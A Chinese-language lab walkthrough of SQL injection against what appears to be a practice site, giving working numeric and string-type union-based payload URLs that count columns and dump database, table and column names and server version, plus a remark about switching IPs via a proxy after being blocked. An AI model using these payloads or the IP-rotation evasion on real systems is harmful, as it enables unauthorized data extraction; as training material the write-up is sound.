### SQL注入

#### 数字型注入

```
http://edu.xss.tv/payload/sql/number.php?id=1 order by 8 判断有7个字段
http://edu.xss.tv/payload/sql/number.php?id=1 and 1=2 union select 1,2,3,4,5,6,7 判断显示的为2,4
```
![](images/1.jpg)

```
爆库:
http://edu.xss.tv/payload/sql/number.php?id=1 and 1=2 union select 1,@@version,3,group_concat(schema_name),5,6,7 from information_schema.schemata

邮箱:information_schema,edutest

爆表:
http://edu.xss.tv/payload/sql/number.php?id=1%20and%201=2%20union%20select%201,@@version,3,group_concat%28table_name%29,5,6,7%20from%20information_schema.tables%20where%20table_schema=database%28%29
邮箱:admin_logs,admins,facebook,message

爆字段:
http://edu.xss.tv/payload/sql/number.php?id=1 and 1=2 union select 1,@@version,3,group_concat(column_name),5,6,7 from information_schema.columns where table_name='message' and table_schema='edutest'

```
ip被封翻水水:

![](images/2.jpg)

shadowsocks fq 换ip继续:

#### 字符型注入
```
http://edu.xss.tv/payload/sql/char.php?id=1%27%20and%201=2%20union%20select%201,@@datadir,3,@@version,5,6,7%23

用户名: /data/mysql/
邮箱:5.6.36-log
```
